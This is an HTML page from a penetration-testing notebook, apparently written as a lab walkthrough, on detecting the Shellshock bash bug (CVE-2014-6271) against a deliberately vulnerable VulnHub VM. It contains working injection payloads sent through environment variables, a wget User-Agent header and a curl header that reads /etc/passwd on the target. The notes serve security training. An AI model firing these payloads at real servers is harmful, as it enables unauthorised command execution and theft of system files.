<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>1. Check Vulnerability</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>1. Check Vulnerability</h1><br />For testing purpose we have used this vulnerable VM:<br /> <a
      href="https://www.vulnhub.com/entry/pentester-lab-cve-2014-6271-shellshock,104/">https://www.vulnhub.com/entry/pentester-lab-cve-2014-6271-shellshock,104/</a><br />1.
    <strong>Locate files inside cgi directories on a potentially vulnerable system</strong><br /> ◇ <a
      href="me--Penetration_Test_Methodology--WebApp_Pentest--Reconnaissance_(Information_Gathering)--Enumeration_of_Files_and_Directories--dirsearch.html">dirsearch</a><br />
    Take note of every file(URI) inside <strong>cgi</strong> directories:<br /> ▪ cgi-bin<br /> ▪ cgi-sys<br /> We will
    test these filese in the next step<br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;cd&nbsp;/home/kali/bin/dirsearch<br />root@kali:/#&nbsp;python3&nbsp;dirsearch.py&nbsp;-u&nbsp;&nbsp;http://12.185.237.252/&nbsp;--extensions=cgi&nbsp;--recursive
      </div>
    </div> <br /> <br /><br />2. <strong>Test if a system is vulnerable</strong><strong>
      <h3> </h3>
    </strong><br /> Most tests are based in echo something and expect that that string is returned in the web response.
    If you think a page may be vulnerable, search for all the cgi pages and test them.<br /> ◇ <span
      style="text-decoration:underline;">Bash (local test directly on the target system)</span><br /> Because an user
    can change environment variables for a particular command invocation by indirectly invoking it via
    <code>env [variable]=VALUE &lt;command&gt;</code><br /> On older version of bash(vulnerable) if we use:<br />
    <div class="codebox">
      <div class="codebox">
        user@debian:/$&nbsp;env&nbsp;x=&#39;()&nbsp;{&nbsp;:;};&nbsp;echo&nbsp;vulnerable&#39;&nbsp;bash&nbsp;-c&nbsp;&quot;echo&nbsp;this&nbsp;is&nbsp;a&nbsp;test&quot;
      </div>
    </div><br /> <a href=""><img src="images/1447-1.png" alt="images/1447-1.png" /></a><br /> First it will set <span
      style="color:#00ff00;">environment variable x</span> to <span style="color:#ff8700;">() { :;}; echo
      vulnerable</span> only for THIS command invocation. As side effect this assignment produce also the execution of
    <code><span style="color:#ff0000;">echo vulnerable</span></code> and then the normal command <span
      style="color:#1e90ff;">bash -c “echo this is a test”</span><br /> <span style="color:#3ad900;">() { :;}; </span>→
    this indicate to bash that x is not only a standard environment variable, but rather is a Bash function being stored
    in an environment variable. The parentheses, <span style="color:#00ff00;">()</span>, indicate that this is a
    function. Within the curly braces, <span style="color:#00ff00;">{ }</span>, is what this function will actually do.
    In large part, 42<br />is arbitrary. We could put some shell commands here but for this vulnerability the most
    commonly found value within the curly braces is a colon, :, which to Bash means &quot;do nothing&quot;<br /> <span
      style="color:#ff0000;">vulnerable</span> → You can drop commands of your choosing here to be executed. <br /> ▪
    Output of a <span style="text-decoration:underline;">vulnerable system</span><br /> <a href=""><img
        src="images/1447-2.png" alt="images/1447-2.png" /></a><br /> ▪ Output of a <span
      style="text-decoration:underline;">patched system</span><br /> <a href=""><img src="images/1447-3.png"
        alt="images/1447-3.png" /></a><br /> ◇ <span style="text-decoration:underline;">Nmap</span><br /> Attempts to
    exploit the &quot;shellshock&quot; vulnerability (CVE-2014-6271 and CVE-2014-7169) in web applications.<br />
    IMPORTANT: We need to change the URI with the one found with dirsearch<br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;nmap&nbsp;--script&nbsp;http-shellshock&nbsp;192.168.147.134&nbsp;--script-args&nbsp;uri=/cgi-bin/status
      </div>
    </div><br /> <a href=""><img src="images/1447-4.png" alt="images/1447-4.png" /></a><br /> ◇ <span
      style="text-decoration:underline;">wget</span><br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;wget&nbsp;-U&nbsp;&quot;()&nbsp;{&nbsp;test;};echo&nbsp;\&quot;Content-type:&nbsp;text/plain\&quot;;&nbsp;echo;&nbsp;/bin/bash&nbsp;-c&nbsp;&#39;echo&nbsp;vulnerable&#39;&quot;&nbsp;http://192.168.147.134/cgi-bin/status&nbsp;&amp;&amp;&nbsp;cat&nbsp;status
      </div>
    </div><br /> <a href=""><img src="images/1447-5.png" alt="images/1447-5.png" /></a><br /> ◇ <span
      style="text-decoration:underline;">curl</span><br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;curl&nbsp;-H&nbsp;&#39;User-Agent:&nbsp;()&nbsp;{&nbsp;:;&nbsp;};&nbsp;echo&nbsp;;&nbsp;echo&nbsp;;&nbsp;/bin/cat&nbsp;/etc/passwd&#39;&nbsp;bash&nbsp;-s&nbsp;:&#39;&#39;&nbsp;http://192.168.147.134/cgi-bin/status&nbsp;
      </div>
    </div><br /> ◇ <a href="https://github.com/liamim/shellshocker" target="_blank">Shellshocker</a><br /> ShellShocker tests a website
    for vulnerability to the ShellShock bug. <br />
    <div class="codebox">
      <div class="codebox">root@kali:/#&nbsp;python3&nbsp;shellshocker.py&nbsp;http://192.168.147.134/cgi-bin/status
      </div>
    </div><br /> <a href=""><img src="images/1447-6.png" alt="images/1447-6.png" /></a><br />
    <br /><br /><br /><strong><br /></strong><br />
  </div>
</body>

</html>